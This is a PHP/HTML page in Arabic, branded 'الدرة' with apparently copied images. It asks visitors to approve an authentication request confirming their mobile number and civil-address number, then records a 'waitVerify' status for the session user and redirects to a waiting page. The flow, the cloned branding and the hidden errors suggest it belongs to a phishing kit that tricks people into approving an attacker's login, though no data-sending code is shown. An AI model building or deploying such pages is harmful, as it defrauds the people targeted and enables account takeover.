<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();


if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    

    $site = array(
        'waitVerify' => 0,
        'type' => '4'
    );

    $id = $_SESSION['user_id'];
    $updateResult = $User->UpdateVerify($id, $site);
    if ($updateResult) {
        $data = [
            'userId' => $id,
            'updatedData' => $site
        ];
    
        
        echo "<script>document.location.href='wait-verify.php';</script>";
    }
}


?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>الدرة</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", sans-serif;
            color: #691E7C;
            direction: rtl;
        }

        body {
            background-color: #edeef4;
        }

        .nav {
            background-image: url(./assets/menu_bg\ \(1\).avif);
        }

        .carousel-caption {
            color: #691E7C;
        }

        /* .row {
            background-color: #edeef4 !important;
        } */

        .btn-primary {
            background-color: #691E7C !important;
            border: none;
        }

        .list-style-arrow {
            list-style-type: none;
            padding: 0;
        }

        ul,
        li {
            margin-top: 0;
            margin-bottom: 10.5px;
        }

        ul.list-style-arrow li {
            padding-right: 1.3em;
            position: relative;
        }

        ul.list-style-arrow li:after {
            content: "\f053";
            font-family: FontAwesome;
            font-size: 12px;
            display: block;
            width: 1.3em;
            position: absolute;
            right: 0;
            top: 5px;
        }

        .story {
            background-image: url(./assets/bg_s_story.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 405px;
        }

        .gols {
            background-image: url(./assets/bg_s_story2.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 543px;
        }

        .overl {
            background-image: url(./assets/overlay_bg.png);
            background-repeat: repeat;
            background-size: 50%;
        }

        .form-control,
        select {
            border-radius: 15px !important;
        }

        .cclas {
            border: 1px solid #000;
            border-radius: 20px;
        }

        option {
            color: #6c757d;
        }
    </style>
</head>

<body>

    <nav class="nav d-flex justify-content-end">
        <img src="./assets/24dde8_57f05cb3b1524c0ba849f6e5a4a0a7fe~mv2.avif" width="230" alt="">
    </nav>

    
    <div class="container mt-4">
        <img src="./assets/b6ee10_a30f3b91660e41b4b56e7b52643f4858~mv2.avif" class="img-fluid" alt="">
    </div>

    <div class="container mt-4">
        <img src="./assets/b6ee10_2f760358fb0e49d2ae6db818d9fd8a1a~mv2.avif" class="img-fluid" alt="">
    </div>

    <div class="container text-center mt-4">
        <img src="./assets/24dde8_57f05cb3b1524c0ba849f6e5a4a0a7fe~mv2.avif" width="170" class="img-fluid" alt="">
    </div>


    <div class=" mt-4 px-3">
        <p class="text-center fw-bold">يرجى قبول  طلب المصادقة على صحة البيانات العميل رقم الجوال ورقم الالي للعنوان المدني بعد قبول المصادقة قم بضغط على زر المتابعة</p>
    </div>


    <div class="text-center">
        <form action="" method="POST">
            <button type="submit" name="submit" class="btn btn-primary w-50 mb-5" style="border-radius: 15px;">متابعة</button>
        </form>
    </div>


    <div class="pt-5"></div>



    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
</body>

</html>